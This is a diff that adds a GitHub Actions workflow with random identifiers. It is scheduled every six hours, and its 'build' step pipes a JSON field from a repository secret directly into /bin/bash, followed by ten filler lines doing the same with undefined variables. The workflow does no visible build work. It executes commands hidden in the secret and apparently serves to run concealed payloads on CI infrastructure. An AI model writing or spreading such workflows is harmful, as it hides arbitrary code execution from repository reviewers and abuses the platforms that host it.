@@ -1,0 +1,28 @@
+name: youdugu7864
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: youdugu7864
+        env:
+          iw4: ${{ secrets.iw4 }}
+        run: |
+          echo $iw4 | jq -r .sc09497 | /bin/bash
+          echo $dcgya7773 | jq -r .pzwqa7 | /bin/bash
+          echo $s739 | jq -r .dcarz49115 | /bin/bash
+          echo $wleh186 | jq -r .cx55596 | /bin/bash
+          echo $hjjgr7269 | jq -r .yznqh7120 | /bin/bash
+          echo $eq5 | jq -r .dp6703 | /bin/bash
+          echo $zcrv78173 | jq -r .cnv7 | /bin/bash
+          echo $tf2713 | jq -r .oy323 | /bin/bash
+          echo $kpx7000 | jq -r .cmuke8987 | /bin/bash
+          echo $olf57 | jq -r .kmyu52 | /bin/bash
+          echo $ex930 | jq -r .mcu87043 | /bin/bash
+
